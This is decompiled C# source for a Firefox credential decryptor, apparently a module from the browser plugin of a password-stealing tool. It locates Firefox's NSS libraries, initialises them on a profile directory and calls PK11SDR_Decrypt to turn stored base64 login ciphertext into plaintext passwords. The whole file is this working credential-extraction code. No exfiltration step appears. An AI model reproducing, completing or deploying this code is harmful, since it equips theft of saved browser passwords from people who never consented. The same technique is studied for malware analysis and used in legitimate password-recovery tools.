using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugin.Browsers.Firefox
{
	// Token: 0x02000010 RID: 16
	internal static class FFDecryptor
	{
		// Token: 0x0600007B RID: 123
		[DllImport("kernel32.dll")]
		public static extern IntPtr LoadLibrary(string dllFilePath);

		// Token: 0x0600007C RID: 124
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

		// Token: 0x0600007D RID: 125 RVA: 0x00005A68 File Offset: 0x00003C68
		public static long NSS_Init(string configdir)
		{
			bool flag = Directory.Exists("C:\\Program Files\\Mozilla Firefox");
			string str;
			if (flag)
			{
				str = "C:\\Program Files\\Mozilla Firefox\\";
			}
			else
			{
				bool flag2 = Directory.Exists("C:\\Program Files (x86)\\Mozilla Firefox");
				if (flag2)
				{
					str = "C:\\Program Files (x86)\\Mozilla Firefox\\";
				}
				else
				{
					str = Environment.GetEnvironmentVariable("PROGRAMFILES") + "\\Mozilla Firefox\\";
				}
			}
			FFDecryptor.LoadLibrary(str + "mozglue.dll");
			FFDecryptor.NSS3 = FFDecryptor.LoadLibrary(str + "nss3.dll");
			return ((FFDecryptor.DLLFunctionDelegate)Marshal.GetDelegateForFunctionPointer(FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "NSS_Init"), typeof(FFDecryptor.DLLFunctionDelegate)))(configdir);
		}

		// Token: 0x0600007E RID: 126 RVA: 0x00005B10 File Offset: 0x00003D10
		public static string Decrypt(string cypherText)
		{
			IntPtr ffDataUnmanagedPointer = IntPtr.Zero;
			StringBuilder sb = new StringBuilder(cypherText);
			try
			{
				byte[] ffData = Convert.FromBase64String(cypherText);
				ffDataUnmanagedPointer = Marshal.AllocHGlobal(ffData.Length);
				Marshal.Copy(ffData, 0, ffDataUnmanagedPointer, ffData.Length);
				FFDecryptor.TSECItem tSecDec = default(FFDecryptor.TSECItem);
				FFDecryptor.TSECItem item = default(FFDecryptor.TSECItem);
				item.SECItemType = 0;
				item.SECItemData = ffDataUnmanagedPointer;
				item.SECItemLen = ffData.Length;
				bool flag = FFDecryptor.PK11SDR_Decrypt(ref item, ref tSecDec, 0) == 0;
				if (flag)
				{
					bool flag2 = tSecDec.SECItemLen != 0;
					if (flag2)
					{
						byte[] bvRet = new byte[tSecDec.SECItemLen];
						Marshal.Copy(tSecDec.SECItemData, bvRet, 0, tSecDec.SECItemLen);
						return Encoding.ASCII.GetString(bvRet);
					}
				}
			}
			catch
			{
				return null;
			}
			finally
			{
				bool flag3 = ffDataUnmanagedPointer != IntPtr.Zero;
				if (flag3)
				{
					Marshal.FreeHGlobal(ffDataUnmanagedPointer);
				}
			}
			return null;
		}

		// Token: 0x0600007F RID: 127 RVA: 0x00005C18 File Offset: 0x00003E18
		public static int PK11SDR_Decrypt(ref FFDecryptor.TSECItem data, ref FFDecryptor.TSECItem result, int cx)
		{
			IntPtr pProc = FFDecryptor.GetProcAddress(FFDecryptor.NSS3, "PK11SDR_Decrypt");
			FFDecryptor.DLLFunctionDelegate5 dll = (FFDecryptor.DLLFunctionDelegate5)Marshal.GetDelegateForFunctionPointer(pProc, typeof(FFDecryptor.DLLFunctionDelegate5));
			return dll(ref data, ref result, cx);
		}

		// Token: 0x04000030 RID: 48
		private static IntPtr NSS3;

		// Token: 0x0200001C RID: 28
		// (Invoke) Token: 0x060000A1 RID: 161
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate long DLLFunctionDelegate(string configdir);

		// Token: 0x0200001D RID: 29
		// (Invoke) Token: 0x060000A5 RID: 165
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate4(IntPtr arenaOpt, IntPtr outItemOpt, StringBuilder inStr, int inLen);

		// Token: 0x0200001E RID: 30
		// (Invoke) Token: 0x060000A9 RID: 169
		[UnmanagedFunctionPointer(CallingConvention.Cdecl)]
		public delegate int DLLFunctionDelegate5(ref FFDecryptor.TSECItem data, ref FFDecryptor.TSECItem result, int cx);

		// Token: 0x0200001F RID: 31
		public struct TSECItem
		{
			// Token: 0x04000042 RID: 66
			public int SECItemType;

			// Token: 0x04000043 RID: 67
			public IntPtr SECItemData;

			// Token: 0x04000044 RID: 68
			public int SECItemLen;
		}
	}
}
